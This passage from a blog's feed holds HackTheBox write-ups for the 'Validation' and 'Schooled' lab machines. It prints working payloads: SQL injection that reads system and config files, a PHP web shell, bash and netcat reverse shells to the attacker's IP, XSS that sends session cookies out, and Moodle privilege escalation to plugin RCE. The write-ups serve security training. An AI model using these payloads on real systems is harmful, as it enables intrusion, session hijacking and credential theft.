8080/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
</code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
</p>
<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
</p>
<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
<span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>

username=choropys&amp;country=Indonesia
</code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
<span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
<span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
<span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
</code></pre></div><p>The response also contains a cookie which is <code>md5sum</code> of the username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«validationÂ» Â«10.10.14.5Â» 
$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
f1bffe3047f1550d765a66e3ac54515c
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="detection">Detection</h4>
<p>I will submit another registration request with the following payload,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>

<span class="g">...[SNIP]...
</span><span class="g">
</span><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
</span></code></pre></div><p>Now when I navigate to <code>/account.php</code> with updated cookie, the page displays an error message.</p>
<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
</p>
<p>If I search for  <code>fetch_assoc()</code> on Google, it&rsquo;s a PHP function that typically used to handle database records.</p>
<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out. From here, I can assume that the site is vulnerable to SQL injection.</p>
<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
</p>
<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
</p>
<p>So the query in the backend only wants a single column.</p>
<h4 id="leak-source">Leak source</h4>
<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
</code></pre></div><p>When I refresh <code>/account.page</code></p>
<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
</p>
<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leaks the configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
</p>
<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>, and it reveals database credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
</p>
<p>I will note these creds.</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="web-shell">Web shell</h4>
<p>I also find that writing files is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
</code></pre></div><p>And now I have code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The system does have bash, but my reverse shell doesn&rsquo;t work with the GET method, so I changed the request to use the POST method and URL encode the payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«validationÂ» Â«10.10.14.5Â» 
$ nc -nvlp <span class="m">21</span>                                                
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@validation:/var/www/html$ id 
id 
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/var/www/html$ which script
which script
/usr/bin/script
www-data@validation:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
www-data@validation:/var/www/html$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>

www-data@validation:/var/www/html$ 
</code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/home/htb$ ls -lR /home
/home:
total <span class="m">4</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb

/home/htb:
total <span class="m">4</span>
-rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
</code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ ls -l .dockerenv
-rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="su-root">su root</h4>
<p>In the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has a login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ su -   
su -
Password: uhc-9qual-global-pw

root@validation:~# 
</code></pre></div><p>I thought I needed to escape from this container, but when I checked the <code>/root/</code> directory, the root flag was there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@validation:/# ls -l /root/root.txt 
-r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
</code></pre></div><p>I also briefly thought that maybe a player had left a copy of the root flag of the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box ended this way ðŸ˜….</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Schooled</title>
      <link>https://fahmifj.github.io/hackthebox/schooled/</link>
      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/schooled/</guid>
      <description>Moodle exploitation using CVEs</description>
      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
Nmap scan report <span class="k">for</span> 10.10.10.234
Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
...<span class="o">[</span>SNIP<span class="o">]</span>...
Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle.</p>
<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
<span class="m">20750</span>
â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
<span class="m">20750</span>
</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
<span class="o">[</span>+<span class="o">]</span> Method:       GET
<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
</code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
</code></pre></div><p>And it&rsquo;s different site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«schooledÂ» Â«10.10.14.49Â» 
$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
<span class="m">84</span>
<span class="m">20750</span>
</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<h4 id="account-register">Account Register</h4>
<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
</p>
<p>I will change my email domain and login afterwards.</p>
<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
<h4 id="enroll-course">Enroll course</h4>
<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
</p>
<p>The oldest announcement by Jamie Borham is just a welcome message and the other titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
</p>
<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<h4 id="exploit-db">Exploit-DB</h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
</p>
<h4 id="moodle-security">Moodle Security</h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>. In there, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
</p>
<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>Or this one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
Host: 10.10.14.49
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
Accept: image/webp,*/*
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
</p>
<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
<p>This Moodle version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
<p>The first step is to join a teacher to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
</p>
<p>I will choose Jamie Borham and enroll it to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
</p>
<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
</p>
<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
</p>
<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
</p>
<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
</p>
<h4 id="malicious-plugin">Malicious Plugin</h4>
<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
</p>
<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre></div><p>On my listener:</p>
<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
</p>
<p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
$ which stty
which stty
/bin/stty
$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
â†’ root@kali Â«exploitsÂ» Â«10.10.14.49Â» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>

$ ls -l
total <span class="m">0</span>
$ ls -la
total <span class="m">0</span>
$ <span class="nb">pwd</span>
